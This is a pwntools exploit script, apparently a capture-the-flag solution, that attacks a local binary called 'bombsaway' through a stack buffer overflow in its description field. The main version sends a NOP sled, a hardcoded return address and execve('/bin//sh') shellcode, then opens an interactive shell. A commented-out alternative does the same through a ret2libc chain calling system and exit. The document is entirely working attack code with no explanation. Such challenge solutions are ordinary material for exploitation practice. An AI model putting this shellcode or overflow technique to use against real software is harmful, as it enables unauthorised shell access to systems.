from pwn import *

def pwn():
        r = process('./bombsaway')
        r.recvuntil('Password: ')
        r.sendline('test')
        r.recvuntil('Select Option: ')
        r.sendline('2')
        r.recvuntil('Input description: ')
        shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

        payload = ""
        payload += "\x90"*556
        payload += p32(0xffffce84)
        payload += "\x90"*200
        payload += shellcode
        r.sendline(payload)
        r.interactive()

pwn()


'''
Alternative exploit
from pwn import *

def pwn():
        r = process('./bombsaway')
        r.recvuntil('Password: ')
        r.sendline('test')
        r.recvuntil('Select Option: ')
        r.sendline('2')
        r.recvuntil('Input description: ')
        payload = ''
        payload += 'A'*556
        payload += p32(0xf7e31da0)
        payload += p32(0xf7e259d0)
        payload += p32(0xf7f52a0b)
        r.sendline(payload)
        r.interactive()

pwn()
'''
